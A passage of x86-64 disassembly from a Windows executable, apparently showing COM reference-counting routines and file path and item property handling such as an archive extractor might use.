   140002c86:	75 05                	jne    0x140002c8d
   140002c88:	49 89 08             	mov    %rcx,(%r8)
   140002c8b:	eb 29                	jmp    0x140002cb6
   140002c8d:	4c 8b 02             	mov    (%rdx),%r8
   140002c90:	4d 3b 83 d0 58 02 00 	cmp    0x258d0(%r11),%r8
   140002c97:	75 11                	jne    0x140002caa
   140002c99:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140002c9d:	4d 3b 83 d8 58 02 00 	cmp    0x258d8(%r11),%r8
   140002ca4:	75 04                	jne    0x140002caa
   140002ca6:	33 c0                	xor    %eax,%eax
   140002ca8:	eb 05                	jmp    0x140002caf
   140002caa:	1b c0                	sbb    %eax,%eax
   140002cac:	83 d8 ff             	sbb    $0xffffffff,%eax
   140002caf:	85 c0                	test   %eax,%eax
   140002cb1:	75 09                	jne    0x140002cbc
   140002cb3:	49 89 09             	mov    %rcx,(%r9)
   140002cb6:	ff 41 08             	incl   0x8(%rcx)
   140002cb9:	33 c0                	xor    %eax,%eax
   140002cbb:	c3                   	ret
   140002cbc:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140002cc1:	c3                   	ret
   140002cc2:	cc                   	int3
   140002cc3:	cc                   	int3
   140002cc4:	48 83 ec 28          	sub    $0x28,%rsp
   140002cc8:	ff 49 08             	decl   0x8(%rcx)
   140002ccb:	8b 41 08             	mov    0x8(%rcx),%eax
   140002cce:	75 0d                	jne    0x140002cdd
   140002cd0:	48 8b 01             	mov    (%rcx),%rax
   140002cd3:	ba 01 00 00 00       	mov    $0x1,%edx
   140002cd8:	ff 50 30             	call   *0x30(%rax)
   140002cdb:	33 c0                	xor    %eax,%eax
   140002cdd:	48 83 c4 28          	add    $0x28,%rsp
   140002ce1:	c3                   	ret
   140002ce2:	cc                   	int3
   140002ce3:	cc                   	int3
   140002ce4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002ce9:	57                   	push   %rdi
   140002cea:	48 83 ec 20          	sub    $0x20,%rsp
   140002cee:	48 8d 05 33 35 02 00 	lea    0x23533(%rip),%rax        # 0x140026228
   140002cf5:	48 8b f9             	mov    %rcx,%rdi
   140002cf8:	8b da                	mov    %edx,%ebx
   140002cfa:	48 89 01             	mov    %rax,(%rcx)
   140002cfd:	48 83 c1 10          	add    $0x10,%rcx
   140002d01:	e8 26 5a 01 00       	call   0x14001872c
   140002d06:	f6 c3 01             	test   $0x1,%bl
   140002d09:	74 08                	je     0x140002d13
   140002d0b:	48 8b cf             	mov    %rdi,%rcx
   140002d0e:	e8 5b 10 02 00       	call   0x140023d6e
   140002d13:	48 8b c7             	mov    %rdi,%rax
   140002d16:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002d1b:	48 83 c4 20          	add    $0x20,%rsp
   140002d1f:	5f                   	pop    %rdi
   140002d20:	c3                   	ret
   140002d21:	cc                   	int3
   140002d22:	cc                   	int3
   140002d23:	cc                   	int3
   140002d24:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002d29:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002d2e:	57                   	push   %rdi
   140002d2f:	48 83 ec 30          	sub    $0x30,%rsp
   140002d33:	48 8b f9             	mov    %rcx,%rdi
   140002d36:	48 83 c1 18          	add    $0x18,%rcx
   140002d3a:	e8 e9 67 01 00       	call   0x140019528
   140002d3f:	8b 47 20             	mov    0x20(%rdi),%eax
   140002d42:	39 47 24             	cmp    %eax,0x24(%rdi)
   140002d45:	75 09                	jne    0x140002d50
   140002d47:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   140002d4b:	e8 5c 64 01 00       	call   0x1400191ac
   140002d50:	8b 57 20             	mov    0x20(%rdi),%edx
   140002d53:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140002d57:	33 f6                	xor    %esi,%esi
   140002d59:	41 b8 5c 00 00 00    	mov    $0x5c,%r8d
   140002d5f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002d64:	4c 8b cf             	mov    %rdi,%r9
   140002d67:	66 44 89 04 51       	mov    %r8w,(%rcx,%rdx,2)
   140002d6c:	ff c2                	inc    %edx
   140002d6e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002d73:	66 89 34 51          	mov    %si,(%rcx,%rdx,2)
   140002d77:	89 57 20             	mov    %edx,0x20(%rdi)
   140002d7a:	4c 8d 05 47 fe ff ff 	lea    -0x1b9(%rip),%r8        # 0x140002bc8
   140002d81:	33 d2                	xor    %edx,%edx
   140002d83:	33 c9                	xor    %ecx,%ecx
   140002d85:	48 89 3d 44 9d 02 00 	mov    %rdi,0x29d44(%rip)        # 0x14002cad0
   140002d8c:	89 35 46 9d 02 00    	mov    %esi,0x29d46(%rip)        # 0x14002cad8
   140002d92:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140002d96:	ff 15 34 25 02 00    	call   *0x22534(%rip)        # 0x1400252d0
   140002d9c:	48 89 05 25 9d 02 00 	mov    %rax,0x29d25(%rip)        # 0x14002cac8
   140002da3:	48 85 c0             	test   %rax,%rax
   140002da6:	74 28                	je     0x140002dd0
   140002da8:	83 3d ad 9d 02 00 02 	cmpl   $0x2,0x29dad(%rip)        # 0x14002cb5c
   140002daf:	74 0c                	je     0x140002dbd
   140002db1:	e8 7a 87 00 00       	call   0x14000b530
   140002db6:	48 8b 05 0b 9d 02 00 	mov    0x29d0b(%rip),%rax        # 0x14002cac8
   140002dbd:	83 ca ff             	or     $0xffffffff,%edx
   140002dc0:	48 8b c8             	mov    %rax,%rcx
   140002dc3:	ff 15 6f 25 02 00    	call   *0x2256f(%rip)        # 0x140025338
   140002dc9:	48 8b 05 f8 9c 02 00 	mov    0x29cf8(%rip),%rax        # 0x14002cac8
   140002dd0:	44 8b 05 01 9d 02 00 	mov    0x29d01(%rip),%r8d        # 0x14002cad8
   140002dd7:	48 89 35 42 9f 02 00 	mov    %rsi,0x29f42(%rip)        # 0x14002cd20
   140002dde:	45 85 c0             	test   %r8d,%r8d
   140002de1:	74 4f                	je     0x140002e32
   140002de3:	41 83 f8 01          	cmp    $0x1,%r8d
   140002de7:	74 3b                	je     0x140002e24
   140002de9:	41 83 f8 02          	cmp    $0x2,%r8d
   140002ded:	74 2e                	je     0x140002e1d
   140002def:	41 83 f8 03          	cmp    $0x3,%r8d
   140002df3:	74 21                	je     0x140002e16
   140002df5:	41 83 f8 67          	cmp    $0x67,%r8d
   140002df9:	7e 0a                	jle    0x140002e05
   140002dfb:	41 83 f8 6b          	cmp    $0x6b,%r8d
   140002dff:	0f 8e 9e 00 00 00    	jle    0x140002ea3
   140002e05:	ba 14 00 00 00       	mov    $0x14,%edx
   140002e0a:	33 c9                	xor    %ecx,%ecx
   140002e0c:	e8 73 96 00 00       	call   0x14000c484
   140002e11:	e9 8d 00 00 00       	jmp    0x140002ea3
   140002e16:	ba 12 00 00 00       	mov    $0x12,%edx
   140002e1b:	eb 0c                	jmp    0x140002e29
   140002e1d:	ba 13 00 00 00       	mov    $0x13,%edx
   140002e22:	eb 05                	jmp    0x140002e29
   140002e24:	ba 11 00 00 00       	mov    $0x11,%edx
   140002e29:	33 c9                	xor    %ecx,%ecx
   140002e2b:	e8 54 96 00 00       	call   0x14000c484
   140002e30:	eb 71                	jmp    0x140002ea3
   140002e32:	39 35 e4 9e 02 00    	cmp    %esi,0x29ee4(%rip)        # 0x14002cd1c
   140002e38:	8b ce                	mov    %esi,%ecx
   140002e3a:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   140002e3e:	75 63                	jne    0x140002ea3
   140002e40:	48 85 c0             	test   %rax,%rax
   140002e43:	74 1e                	je     0x140002e63
   140002e45:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002e4a:	48 8b c8             	mov    %rax,%rcx
   140002e4d:	ff 15 85 24 02 00    	call   *0x22485(%rip)        # 0x1400252d8
   140002e53:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   140002e57:	85 c0                	test   %eax,%eax
   140002e59:	74 08                	je     0x140002e63
   140002e5b:	85 c9                	test   %ecx,%ecx
   140002e5d:	75 04                	jne    0x140002e63
   140002e5f:	33 c0                	xor    %eax,%eax
   140002e61:	eb 45                	jmp    0x140002ea8
   140002e63:	ba 00 00 07 80       	mov    $0x80070000,%edx
   140002e68:	8b c1                	mov    %ecx,%eax
   140002e6a:	23 c2                	and    %edx,%eax
   140002e6c:	3b c2                	cmp    %edx,%eax
   140002e6e:	74 0a                	je     0x140002e7a
   140002e70:	44 8b c1             	mov    %ecx,%r8d
   140002e73:	ba 21 00 00 00       	mov    $0x21,%edx
   140002e78:	eb 90                	jmp    0x140002e0a
   140002e7a:	0f b7 c9             	movzwl %cx,%ecx
   140002e7d:	83 f9 0e             	cmp    $0xe,%ecx
   140002e80:	75 09                	jne    0x140002e8b
   140002e82:	83 3d d7 9c 02 00 ff 	cmpl   $0xffffffff,0x29cd7(%rip)        # 0x14002cb60
   140002e89:	74 18                	je     0x140002ea3
   140002e8b:	ff 15 67 24 02 00    	call   *0x22467(%rip)        # 0x1400252f8
   140002e91:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   140002e96:	ba 22 00 00 00       	mov    $0x22,%edx
   140002e9b:	8d 4a df             	lea    -0x21(%rdx),%ecx
   140002e9e:	e8 e1 95 00 00       	call   0x14000c484
   140002ea3:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140002ea8:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140002ead:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140002eb2:	48 83 c4 30          	add    $0x30,%rsp
   140002eb6:	5f                   	pop    %rdi
   140002eb7:	c3                   	ret
   140002eb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002ebd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002ec2:	57                   	push   %rdi
   140002ec3:	48 83 ec 20          	sub    $0x20,%rsp
   140002ec7:	48 8b f1             	mov    %rcx,%rsi
   140002eca:	b9 20 00 00 00       	mov    $0x20,%ecx
   140002ecf:	48 8b fa             	mov    %rdx,%rdi
   140002ed2:	e8 a3 0e 02 00       	call   0x140023d7a
   140002ed7:	48 8b d8             	mov    %rax,%rbx
   140002eda:	48 85 c0             	test   %rax,%rax
   140002edd:	74 1a                	je     0x140002ef9
   140002edf:	48 8b d7             	mov    %rdi,%rdx
   140002ee2:	48 8b c8             	mov    %rax,%rcx
   140002ee5:	e8 02 66 01 00       	call   0x1400194ec
   140002eea:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140002eee:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140002ef2:	e8 f5 65 01 00       	call   0x1400194ec
   140002ef7:	eb 02                	jmp    0x140002efb
   140002ef9:	33 db                	xor    %ebx,%ebx
   140002efb:	48 8b ce             	mov    %rsi,%rcx
   140002efe:	e8 b9 c4 01 00       	call   0x14001f3bc
   140002f03:	8b 4e 08             	mov    0x8(%rsi),%ecx
   140002f06:	48 8b 06             	mov    (%rsi),%rax
   140002f09:	48 89 1c c8          	mov    %rbx,(%rax,%rcx,8)
   140002f0d:	8b 46 08             	mov    0x8(%rsi),%eax
   140002f10:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f15:	8d 48 01             	lea    0x1(%rax),%ecx
   140002f18:	89 4e 08             	mov    %ecx,0x8(%rsi)
   140002f1b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002f20:	48 83 c4 20          	add    $0x20,%rsp
   140002f24:	5f                   	pop    %rdi
   140002f25:	c3                   	ret
   140002f26:	cc                   	int3
   140002f27:	cc                   	int3
   140002f28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f2d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002f32:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002f37:	57                   	push   %rdi
   140002f38:	48 83 ec 20          	sub    $0x20,%rsp
   140002f3c:	48 8b 01             	mov    (%rcx),%rax
   140002f3f:	8b f2                	mov    %edx,%esi
   140002f41:	48 8b f9             	mov    %rcx,%rdi
   140002f44:	48 8b 1c f0          	mov    (%rax,%rsi,8),%rbx
   140002f48:	48 85 db             	test   %rbx,%rbx
   140002f4b:	74 19                	je     0x140002f66
   140002f4d:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140002f51:	e8 18 0e 02 00       	call   0x140023d6e
   140002f56:	48 8b 0b             	mov    (%rbx),%rcx
   140002f59:	e8 10 0e 02 00       	call   0x140023d6e
   140002f5e:	48 8b cb             	mov    %rbx,%rcx
   140002f61:	e8 08 0e 02 00       	call   0x140023d6e
   140002f66:	4c 8b 0f             	mov    (%rdi),%r9
   140002f69:	44 8b 47 08          	mov    0x8(%rdi),%r8d
   140002f6d:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140002f70:	44 2b c1             	sub    %ecx,%r8d
   140002f73:	49 8d 14 c9          	lea    (%r9,%rcx,8),%rdx
   140002f77:	49 8d 0c f1          	lea    (%r9,%rsi,8),%rcx
   140002f7b:	49 c1 e0 03          	shl    $0x3,%r8
   140002f7f:	ff 15 b3 26 02 00    	call   *0x226b3(%rip)        # 0x140025638
   140002f85:	ff 4f 08             	decl   0x8(%rdi)
   140002f88:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f8d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002f92:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002f97:	48 83 c4 20          	add    $0x20,%rsp
   140002f9b:	5f                   	pop    %rdi
   140002f9c:	c3                   	ret
   140002f9d:	cc                   	int3
   140002f9e:	cc                   	int3
   140002f9f:	cc                   	int3
   140002fa0:	40 53                	rex push %rbx
   140002fa2:	48 83 ec 20          	sub    $0x20,%rsp
   140002fa6:	ff 49 10             	decl   0x10(%rcx)
   140002fa9:	8b 41 10             	mov    0x10(%rcx),%eax
   140002fac:	48 8b d9             	mov    %rcx,%rbx
   140002faf:	75 2b                	jne    0x140002fdc
   140002fb1:	48 8b 49 40          	mov    0x40(%rcx),%rcx
   140002fb5:	e8 b4 0d 02 00       	call   0x140023d6e
   140002fba:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140002fbe:	48 85 c9             	test   %rcx,%rcx
   140002fc1:	74 06                	je     0x140002fc9
   140002fc3:	48 8b 01             	mov    (%rcx),%rax
   140002fc6:	ff 50 10             	call   *0x10(%rax)
   140002fc9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140002fcd:	e8 9c 0d 02 00       	call   0x140023d6e
   140002fd2:	48 8b cb             	mov    %rbx,%rcx
   140002fd5:	e8 94 0d 02 00       	call   0x140023d6e
   140002fda:	33 c0                	xor    %eax,%eax
   140002fdc:	48 83 c4 20          	add    $0x20,%rsp
   140002fe0:	5b                   	pop    %rbx
   140002fe1:	c3                   	ret
   140002fe2:	cc                   	int3
   140002fe3:	cc                   	int3
   140002fe4:	48 8b c4             	mov    %rsp,%rax
   140002fe7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002feb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002fef:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002ff3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140002ff7:	55                   	push   %rbp
   140002ff8:	41 55                	push   %r13
   140002ffa:	41 56                	push   %r14
   140002ffc:	48 8b ec             	mov    %rsp,%rbp
   140002fff:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003006:	45 33 f6             	xor    %r14d,%r14d
   140003009:	4d 8b e8             	mov    %r8,%r13
   14000300c:	8b f2                	mov    %edx,%esi
   14000300e:	44 39 35 07 9d 02 00 	cmp    %r14d,0x29d07(%rip)        # 0x14002cd1c
   140003015:	48 8b f9             	mov    %rcx,%rdi
   140003018:	74 0a                	je     0x140003024
   14000301a:	b8 04 40 00 80       	mov    $0x80004004,%eax
   14000301f:	e9 7c 03 00 00       	jmp    0x1400033a0
   140003024:	4d 89 30             	mov    %r14,(%r8)
   140003027:	45 85 c9             	test   %r9d,%r9d
   14000302a:	74 07                	je     0x140003033
   14000302c:	33 c0                	xor    %eax,%eax
   14000302e:	e9 6d 03 00 00       	jmp    0x1400033a0
   140003033:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   140003037:	48 85 c9             	test   %rcx,%rcx
   14000303a:	74 0a                	je     0x140003046
   14000303c:	48 8b 01             	mov    (%rcx),%rax
   14000303f:	ff 50 10             	call   *0x10(%rax)
   140003042:	4c 89 77 38          	mov    %r14,0x38(%rdi)
   140003046:	48 8b 0d 83 9b 02 00 	mov    0x29b83(%rip),%rcx        # 0x14002cbd0
   14000304d:	44 89 75 e8          	mov    %r14d,-0x18(%rbp)
   140003051:	4c 89 75 f0          	mov    %r14,-0x10(%rbp)
   140003055:	48 8b 01             	mov    (%rcx),%rax
   140003058:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   14000305c:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140003062:	8b d6                	mov    %esi,%edx
   140003064:	ff 50 30             	call   *0x30(%rax)
   140003067:	8b d8                	mov    %eax,%ebx
   140003069:	85 c0                	test   %eax,%eax
   14000306b:	0f 85 24 03 00 00    	jne    0x140003395
   140003071:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140003075:	e8 de 63 01 00       	call   0x140019458
   14000307a:	44 0f b7 5d e8       	movzwl -0x18(%rbp),%r11d
   14000307f:	66 45 85 db          	test   %r11w,%r11w
   140003083:	0f 84 f3 02 00 00    	je     0x14000337c
   140003089:	66 41 83 fb 08       	cmp    $0x8,%r11w
   14000308e:	0f 85 e8 02 00 00    	jne    0x14000337c
   140003094:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140003098:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   14000309c:	e8 87 64 01 00       	call   0x140019528
   1400030a1:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   1400030a5:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   1400030a9:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400030ad:	e8 f2 62 01 00       	call   0x1400193a4
   1400030b2:	48 8d 4f 40          	lea    0x40(%rdi),%rcx
   1400030b6:	48 8b 10             	mov    (%rax),%rdx
   1400030b9:	e8 6a 64 01 00       	call   0x140019528
   1400030be:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400030c2:	e8 a7 0c 02 00       	call   0x140023d6e
   1400030c7:	48 8b 0d 02 9b 02 00 	mov    0x29b02(%rip),%rcx        # 0x14002cbd0
   1400030ce:	44 89 75 d0          	mov    %r14d,-0x30(%rbp)
   1400030d2:	4c 89 75 d8          	mov    %r14,-0x28(%rbp)
   1400030d6:	48 8b 01             	mov    (%rcx),%rax
   1400030d9:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   1400030dd:	44 8d 43 09          	lea    0x9(%rbx),%r8d
   1400030e1:	8b d6                	mov    %esi,%edx
   1400030e3:	ff 50 30             	call   *0x30(%rax)
   1400030e6:	8b d8                	mov    %eax,%ebx
   1400030e8:	85 c0                	test   %eax,%eax
   1400030ea:	0f 85 81 02 00 00    	jne    0x140003371
   1400030f0:	0f b7 45 d0          	movzwl -0x30(%rbp),%eax
   1400030f4:	66 85 c0             	test   %ax,%ax
   1400030f7:	75 06                	jne    0x1400030ff
   1400030f9:	44 89 77 68          	mov    %r14d,0x68(%rdi)
   1400030fd:	eb 1f                	jmp    0x14000311e
   1400030ff:	66 83 f8 13          	cmp    $0x13,%ax
   140003103:	74 13                	je     0x140003118
   140003105:	ba 65 00 00 00       	mov    $0x65,%edx
   14000310a:	48 8b 07             	mov    (%rdi),%rax
   14000310d:	48 8b cf             	mov    %rdi,%rcx
   140003110:	ff 50 38             	call   *0x38(%rax)
   140003113:	e9 57 02 00 00       	jmp    0x14000336f
   140003118:	8b 45 d8             	mov    -0x28(%rbp),%eax
   14000311b:	89 47 68             	mov    %eax,0x68(%rdi)
   14000311e:	48 8b 0d ab 9a 02 00 	mov    0x29aab(%rip),%rcx        # 0x14002cbd0
   140003125:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140003129:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000312f:	48 8b 01             	mov    (%rcx),%rax
   140003132:	8b d6                	mov    %esi,%edx
   140003134:	ff 50 30             	call   *0x30(%rax)
   140003137:	8b d8                	mov    %eax,%ebx
   140003139:	85 c0                	test   %eax,%eax
   14000313b:	0f 85 30 02 00 00    	jne    0x140003371
   140003141:	66 44 39 75 d8       	cmp    %r14w,-0x28(%rbp)
   140003146:	41 8b c6             	mov    %r14d,%eax
   140003149:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   14000314d:	0f 95 c0             	setne  %al
   140003150:	44 8d 43 0c          	lea    0xc(%rbx),%r8d
   140003154:	8b d6                	mov    %esi,%edx
   140003156:	89 47 64             	mov    %eax,0x64(%rdi)
   140003159:	48 8b 0d 70 9a 02 00 	mov    0x29a70(%rip),%rcx        # 0x14002cbd0
   140003160:	48 8b 01             	mov    (%rcx),%rax
   140003163:	ff 50 30             	call   *0x30(%rax)
   140003166:	8b d8                	mov    %eax,%ebx
   140003168:	85 c0                	test   %eax,%eax
   14000316a:	0f 85 01 02 00 00    	jne    0x140003371
   140003170:	0f b7 45 d0          	movzwl -0x30(%rbp),%eax
   140003174:	85 c0                	test   %eax,%eax
   140003176:	74 17                	je     0x14000318f
   140003178:	83 f8 40             	cmp    $0x40,%eax
   14000317b:	74 05                	je     0x140003182
   14000317d:	8d 53 66             	lea    0x66(%rbx),%edx
   140003180:	eb 88                	jmp    0x14000310a
   140003182:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140003186:	48 8d 5f 5c          	lea    0x5c(%rdi),%rbx
   14000318a:	48 89 03             	mov    %rax,(%rbx)
   14000318d:	eb 1b                	jmp    0x1400031aa
   14000318f:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003193:	ff 15 27 21 02 00    	call   *0x22127(%rip)        # 0x1400252c0
   140003199:	48 8d 5f 5c          	lea    0x5c(%rdi),%rbx
   14000319d:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400031a1:	48 8b d3             	mov    %rbx,%rdx
   1400031a4:	ff 15 1e 21 02 00    	call   *0x2211e(%rip)        # 0x1400252c8
   1400031aa:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   1400031ae:	44 39 77 64          	cmp    %r14d,0x64(%rdi)
   1400031b2:	74 2b                	je     0x1400031df
   1400031b4:	e8 cb 26 00 00       	call   0x140005884
   1400031b9:	85 c0                	test   %eax,%eax
   1400031bb:	75 08                	jne    0x1400031c5
   1400031bd:	8d 50 68             	lea    0x68(%rax),%edx
   1400031c0:	e9 45 ff ff ff       	jmp    0x14000310a
   1400031c5:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400031c9:	e8 02 59 01 00       	call   0x140018ad0
   1400031ce:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   1400031d2:	e8 97 0b 02 00       	call   0x140023d6e
   1400031d7:	41 8b de             	mov    %r14d,%ebx
   1400031da:	e9 b6 01 00 00       	jmp    0x140003395
   1400031df:	48 8b d3             	mov    %rbx,%rdx
   1400031e2:	e8 c1 22 00 00       	call   0x1400054a8
   1400031e7:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400031ea:	0f 84 68 01 00 00    	je     0x140003358
   1400031f0:	83 f8 01             	cmp    $0x1,%eax
   1400031f3:	74 d0                	je     0x1400031c5
   1400031f5:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400031fa:	e8 7b 0b 02 00       	call   0x140023d7a
   1400031ff:	48 8b f0             	mov    %rax,%rsi
   140003202:	48 85 c0             	test   %rax,%rax
   140003205:	74 15                	je     0x14000321c
   140003207:	44 89 70 08          	mov    %r14d,0x8(%rax)
   14000320b:	48 8d 05 16 30 02 00 	lea    0x23016(%rip),%rax        # 0x140026228
   140003212:	48 89 06             	mov    %rax,(%rsi)
   140003215:	48 83 4e 10 ff       	orq    $0xffffffffffffffff,0x10(%rsi)
   14000321a:	eb 03                	jmp    0x14000321f
   14000321c:	49 8b f6             	mov    %r14,%rsi
   14000321f:	48 89 77 30          	mov    %rsi,0x30(%rdi)
   140003223:	48 85 f6             	test   %rsi,%rsi
   140003226:	74 09                	je     0x140003231
   140003228:	48 8b 06             	mov    (%rsi),%rax
   14000322b:	48 8b ce             	mov    %rsi,%rcx
   14000322e:	ff 50 08             	call   *0x8(%rax)
   140003231:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   140003235:	48 8b 57 40          	mov    0x40(%rdi),%rdx
   140003239:	41 b0 01             	mov    $0x1,%r8b
   14000323c:	4c 89 71 18          	mov    %r14,0x18(%rcx)
   140003240:	48 83 c1 10          	add    $0x10,%rcx
   140003244:	e8 d3 57 01 00       	call   0x140018a1c
   140003249:	84 c0                	test   %al,%al
   14000324b:	0f 85 c2 00 00 00    	jne    0x140003313
   140003251:	ff 15 21 21 02 00    	call   *0x22121(%rip)        # 0x140025378
   140003257:	48 8d 57 40          	lea    0x40(%rdi),%rdx
   14000325b:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000325f:	8b d8                	mov    %eax,%ebx
   140003261:	e8 86 62 01 00       	call   0x1400194ec
   140003266:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000326a:	e8 51 11 00 00       	call   0x1400043c0
   14000326f:	85 c0                	test   %eax,%eax
   140003271:	79 34                	jns    0x1400032a7
   140003273:	4c 8b 0f             	mov    (%rdi),%r9
   140003276:	44 8b c3             	mov    %ebx,%r8d
   140003279:	ba 6a 00 00 00       	mov    $0x6a,%edx
   14000327e:	48 8b cf             	mov    %rdi,%rcx
   140003281:	41 ff 51 40          	call   *0x40(%r9)
   140003285:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140003289:	8b d8                	mov    %eax,%ebx
   14000328b:	e8 de 0a 02 00       	call   0x140023d6e
   140003290:	48 85 f6             	test   %rsi,%rsi
   140003293:	0f 84 d8 00 00 00    	je     0x140003371
   140003299:	48 8b 16             	mov    (%rsi),%rdx
   14000329c:	48 8b ce             	mov    %rsi,%rcx
   14000329f:	ff 52 10             	call   *0x10(%rdx)
   1400032a2:	e9 ca 00 00 00       	jmp    0x140003371
   1400032a7:	8b c8                	mov    %eax,%ecx
   1400032a9:	89 45 b8             	mov    %eax,-0x48(%rbp)
   1400032ac:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   1400032b0:	66 44 89 34 48       	mov    %r14w,(%rax,%rcx,2)
   1400032b5:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400032b9:	e8 c6 25 00 00       	call   0x140005884
   1400032be:	85 c0                	test   %eax,%eax
   1400032c0:	75 10                	jne    0x1400032d2
   1400032c2:	48 8b 07             	mov    (%rdi),%rax
   1400032c5:	ba 68 00 00 00       	mov    $0x68,%edx
   1400032ca:	48 8b cf             	mov    %rdi,%rcx
   1400032cd:	ff 50 38             	call   *0x38(%rax)
   1400032d0:	eb b3                	jmp    0x140003285
   1400032d2:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   1400032d6:	48 8b 57 40          	mov    0x40(%rdi),%rdx
   1400032da:	41 b0 01             	mov    $0x1,%r8b
   1400032dd:	4c 89 71 18          	mov    %r14,0x18(%rcx)
   1400032e1:	48 83 c1 10          	add    $0x10,%rcx
   1400032e5:	e8 32 57 01 00       	call   0x140018a1c
   1400032ea:	84 c0                	test   %al,%al
   1400032ec:	75 1c                	jne    0x14000330a
   1400032ee:	48 8b 1f             	mov    (%rdi),%rbx
   1400032f1:	ff 15 81 20 02 00    	call   *0x22081(%rip)        # 0x140025378
   1400032f7:	ba 6a 00 00 00       	mov    $0x6a,%edx
   1400032fc:	44 8b c0             	mov    %eax,%r8d
   1400032ff:	48 8b cf             	mov    %rdi,%rcx
   140003302:	ff 53 40             	call   *0x40(%rbx)
   140003305:	e9 7b ff ff ff       	jmp    0x140003285
   14000330a:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   14000330e:	e8 5b 0a 02 00       	call   0x140023d6e
   140003313:	48 85 f6             	test   %rsi,%rsi
   140003316:	74 09                	je     0x140003321
   140003318:	48 8b 06             	mov    (%rsi),%rax
   14000331b:	48 8b ce             	mov    %rsi,%rcx
   14000331e:	ff 50 08             	call   *0x8(%rax)
   140003321:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140003325:	48 85 c9             	test   %rcx,%rcx
   140003328:	74 06                	je     0x140003330
   14000332a:	48 8b 01             	mov    (%rcx),%rax
   14000332d:	ff 50 10             	call   *0x10(%rax)
   140003330:	48 89 77 38          	mov    %rsi,0x38(%rdi)
   140003334:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003338:	49 89 75 00          	mov    %rsi,0x0(%r13)
   14000333c:	e8 8f 57 01 00       	call   0x140018ad0
   140003341:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   140003345:	e8 24 0a 02 00       	call   0x140023d6e
   14000334a:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   14000334e:	e8 7d 57 01 00       	call   0x140018ad0
   140003353:	e9 d4 fc ff ff       	jmp    0x14000302c
   140003358:	48 8b 1f             	mov    (%rdi),%rbx
   14000335b:	ff 15 17 20 02 00    	call   *0x22017(%rip)        # 0x140025378
   140003361:	ba 69 00 00 00       	mov    $0x69,%edx
   140003366:	44 8b c0             	mov    %eax,%r8d
   140003369:	48 8b cf             	mov    %rdi,%rcx
   14000336c:	ff 53 40             	call   *0x40(%rbx)
   14000336f:	8b d8                	mov    %eax,%ebx
